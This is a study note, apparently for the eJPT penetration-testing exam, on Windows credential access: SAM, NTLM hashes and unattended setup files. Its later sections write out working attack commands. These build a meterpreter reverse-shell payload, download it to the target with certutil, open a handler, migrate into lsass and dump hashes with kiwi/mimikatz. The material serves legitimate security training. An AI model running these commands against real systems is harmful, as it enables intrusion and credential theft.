---
title: Windows Credential Access
dg-publish: true
---

# Windows Credential Access

> [!info] Navigation
> [[Home]] | [[Master Table of Contents]] | [[Exam Cram Guide]] | [[Command Dashboard]] | [[Curated External Sources]] | [[Main/03 - Study Materials/eJPT/10 - Visual Diagrams/Index]]



## Sections in This Note
- [[#SAM Database|SAM Database]]
- [[#NTLM (NT Hash)|NTLM (NT Hash)]]

---

## SAM Database
SAM (Security Account Manager) is a database file responsible for managing user accounts and passwords on Windows. All account passwords in the SAM database are hashed. The SAM database file cannot be copied while the operating system is running.

The Windows NT kernel keeps the SAM database file locked, so attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.

*Note: Administrative privileges are required to access and interact with the LSASS process.*

## NTLM (NT Hash)
NTLM is a collection of authentication protocols utilized in Windows to facilitate authentication between computers. The authentication process involves using a valid username and password. When the user account is created, the password is encrypted using the MD4 hashing algorithm.

## Searching for Passwords in Windows Configuration Files

Windows can automate a variety of repetitive tasks, such as mass rollout/installation, typically via the Unattended Windows Setup utility. This tool utilizes configuration files containing specific configurations and user account credentials, specifically the Administrator account's password. If Unattended Windows Setup configuration files are left on the target system after installation, they can reveal credentials that attackers can use to authenticate legitimately.


## Related
- [[Exam Cram Guide]]
- [[Command Dashboard]]

---
## Migrated from Unsorted Notes — Windows Password Hashes

### Windows Password Hashes
The Windows OS stores hashed user account passwords locally in the SAM (Security Account Manager) database. Hashing converts a piece of data into another value using a hashing function or algorithm; the result is known as a hash or hash value. Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA).

---
## Migrated from Unsorted Notes — Unattended Windows Setup

### Unattended Windows Setup

Configuration files typically used:
- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Autounattend.xml`

As a security precaution, the passwords stored in these files may be encoded in base64.

**Create a payload using msfvenom:**
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.12.2 LPORT=1234 -f exe > payload.exe
```

**Create an HTTP server:**
```
python -m SimpleHTTPServer 80
```

**On the target machine's cmd, download the payload:**
```
certutil -urlcache -f http://10.10.12.2/payload.exe payload.exe
```

**Back on Kali, close the HTTP server and start postgresql and Metasploit:**
```
service postgresql start && msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.12.2
set LPORT 1234
run
```

Once the attacker runs the payload, the meterpreter session starts.

**Download the unattend.xml file using this session, find the password, and decode it:**
```
base64 -d /root/Desktop/pw.txt
```

---
## Migrated from Unsorted Notes — Dumping Hashes

### Dumping Hashes

After getting privileges:
```
meterpreter > migrate -N lsass.exe
[*] Migrating from 4132 to 768...
[*] Migration completed successfully.
meterpreter >
```

**Load kiwi extension:**
```
Command: load kiwi
```
```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

Success.
meterpreter >
```

- **Dump Administrator NTLM hash:** `creds_all`
- **Extract all users' NTLM hashes:** `lsa_dump_sam`
- **Find the syskey by dumping LSA secrets:** `lsa_dump_secrets`

---
